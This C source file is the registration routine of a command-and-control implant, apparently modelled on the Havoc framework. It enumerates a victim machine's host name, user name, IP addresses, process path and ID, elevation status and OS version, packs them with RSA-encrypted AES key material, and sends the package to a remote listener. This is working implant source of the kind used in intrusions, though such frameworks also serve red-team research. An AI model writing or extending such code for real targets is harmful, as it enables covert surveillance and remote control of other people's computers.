#include "agent.h"
#include "package.h"
#include "enum.h"
#include "http.h"
#include "localcstd.h"
/*

Taken from havoc as a basic model.
     Unencrypted Header (if specified):
        [ SIZE         ] 4 bytes
        [ Magic Value  ] 4 bytes
        [ Agent ID     ] 4 bytes
        [ COMMAND ID   ] 4 bytes
        [ Request ID   ] 4 bytes

     Encrypted Using RSA MetaData:
        [ Encrypted AES KEY ] 0x100 bytes
        [ Encrypted AES IV  ] 0x100 bytes

     Encrypted MetaData:

        [ Magic Value  ] 4 bytes
        [ Demon ID     ] 4 bytes
        [ Host Name    ] size + bytes
        [ User Name    ] size + bytes
        [ Domain       ] size + bytes
        [ IP Address   ] 16 bytes?
        [ Process Name ] size + bytes
        [ Process ID   ] 4 bytes
        [ Parent  PID  ] 4 bytes
        [ Process Arch ] 4 bytes
        [ Elevated     ] 4 bytes
        [ Base Address ] 8 bytes
        [ OS Info      ] ( 5 * 4 ) bytes
        [ OS Arch      ] 4 bytes
        [ SleepDelay   ] 4 bytes
        [ SleepJitter  ] 4 bytes
        [ Killdate     ] 8 bytes
        [ WorkingHours ] 4 bytes
        ..... more
        [ Optional     ] Eg: Pivots, Extra data about the host or network etc.

        */


//TODO: BIG VERY IMPORTANT. add all the data to the pPack variable. Name it metadata. Then add it to the agent packages list and send it off.
INT RegisterAgent(pAgent agent) {
    INT err;
    pPackage pPack;

    if ((pPack = CreatePackageWithMetaData(REGISTER_AGENT, agent)) == NULL) {
        printf("[error] attempting to create package\n");
        return -1;
    }
    //add package to agentData.
    agent->MetaDataPackage = pPack;
    AddPackageToAgentPackageList(agent, pPack);


    if ((err = AddBytesToPackage(pPack, agent->EncryptedAESKey, agent->EncryptedAESKeySize)) != PACKAGE_SUCCESS)
    {
        printf("[error] attempting to add aes key to package\n");
        return -1;
    }

    if ((err = AddBytesToPackage(pPack, agent->EncryptedIV, agent->EncryptedIVSize)) != PACKAGE_SUCCESS)
    {
        printf("[error] attempting to add aes key to package\n");
        return -1;
    }

    if (!Enumerate(agent)) {
        printf("[error] attempting to enumerate\n");
        return -1;
    }
    if ((err = AddInt32ToPackage(pPack, AGENT_MAGIC_VALUE)) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add magic value to package\n");
        return -1;
    }
    if ((err = AddInt32ToPackage(pPack, agent->config->AgentID)) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add agent id to package\n");
        return -1;
    }
    if ((err = AddInt32ToPackage(pPack,  StringLengthA(agent->Context->ComputerName))) != PACKAGE_SUCCESS) {
		printf("[error] attempting to add computer name string length to package\n");
		return -1;
	}
    if ((err = AddStringToPackage(pPack, agent->Context->ComputerName)) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add computer name to package\n");
        return -1;
    }
    if ((err = AddInt32ToPackage(pPack, StringLengthA(agent->Context->UserName))) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add username string length to package\n");
        return -1;
    }
    if ((err = AddStringToPackage(pPack, agent->Context->UserName)) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add user name to package\n");
        return -1;
    }

    INT Adapters = 0;
    INT IPS = 0;
    while (Adapters < 10) {
        IPS = 0;
        if (agent->Context->IPAddress[Adapters][IPS] == NULL) {
            Adapters++;
            continue;
        }
        if((err = AddInt32ToPackage(pPack, StringLengthA(agent->Context->IPAddress[Adapters][IPS]))) != PACKAGE_SUCCESS) {
            printf("[error] attempting to add adapter string length to package\n");
            return -1;
        }
        if ((err = AddStringToPackage(pPack, agent->Context->IPAddress[Adapters][IPS])) != PACKAGE_SUCCESS) {
            printf("[error] attempting to add adapters to package\n");
            return -1;
        }
        IPS++;
        while(agent->Context->IPAddress[Adapters][IPS] != NULL && IPS < 5) {
            if((err = AddInt32ToPackage(pPack, StringLengthA(agent->Context->IPAddress[Adapters][IPS]))) != PACKAGE_SUCCESS) {
                printf("[error] attempting to add ip address string length to package\n");
                return -1;
            }
         
			if ((err = AddStringToPackage(pPack, agent->Context->IPAddress[Adapters][IPS])) != PACKAGE_SUCCESS) {
				printf("[error] attempting to add ip address to package\n");
				return -1;
			}
			IPS++;
		}
        Adapters++;
    }
    if ((err = AddInt32ToPackage(pPack, ((PRTL_USER_PROCESS_PARAMETERS)agent->pTeb->ProcessEnvironmentBlock->ProcessParameters)->ImagePathName.Length)) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add process name length to package\n");
        return -1;
    }
    if((err = AddWStringToPackage(pPack, (  (PRTL_USER_PROCESS_PARAMETERS ) agent->pTeb->ProcessEnvironmentBlock->ProcessParameters)->ImagePathName.Buffer ) ) != PACKAGE_SUCCESS) {
		printf("[error] attempting to add computer name to package\n");
		return -1;
	}
    if ((err = AddInt32ToPackage(pPack, (DWORD)(ULONG_PTR) agent->pTeb->ClientId.UniqueProcess)) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add process id to package\n");
        return -1;
    }
    //if ((err = AddInt32ToPackage(agent->packages, (DWORD)(ULONG_PTR)agent->pTeb->ClientId.UniqueThread)) != PACKAGE_SUCCESS) {
    //    printf("[error] attempting to add parent process id to package\n");
    //    return -1;
    //}
    if((err = AddInt32ToPackage(pPack, agent->Context->Process_Arch)) != PACKAGE_SUCCESS) {
		printf("[error] attempting to add platform id to package\n");
		return -1;
	}
    if ((err = AddInt32ToPackage(pPack, agent->Context->Elevated)) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add elevated to package\n");
        return -1;
    }
    if ((err = AddInt32ToPackage(pPack, agent->Context->dwMajorVersion)) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add major version to package\n");
        return -1;
    }
    if ((err = AddInt32ToPackage(pPack, agent->Context->dwMinorVersion)) != PACKAGE_SUCCESS) {
		printf("[error] attempting to add minor version to package\n");
		return -1;
	}
    if ((err = AddInt32ToPackage(pPack, agent->Context->wProductType)) != PACKAGE_SUCCESS) {
		printf("[error] attempting to add product type number to package\n");
		return -1;
	}
    if ((err = AddInt32ToPackage(pPack, agent->Context->wServicePackMajor)) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add service pack number to package\n");
        return -1;
    }
    if ((err = AddInt32ToPackage(pPack, agent->Context->dwBuildNumber)) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add build number to package\n");
        return -1;
    }
    if ((err = AddInt32ToPackage(pPack, agent->Context->OS_Arch)) != PACKAGE_SUCCESS) {
        printf("[error] attempting to add os arch to package\n");
        return -1;
    }

	if ((PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL, agent)) != PACKAGE_SUCCESS) {
		printf("[error] attempting to send package\n");
		agent->config->listenerConfig.CurrentHost->NumFailures++;
		return -1;
	}

    return err;
}

BOOL SendRegisterRequest(pAgent agent, VOID* Buffer, ULONG BufferLength) {

    if ((PerformRequest(agent, Buffer, BufferLength)) == 0) {
        agent->session->Active = TRUE;
        return TRUE;
    }
    else {
        agent->config->listenerConfig.CurrentHost->NumFailures++;
        return FALSE;
    }
}
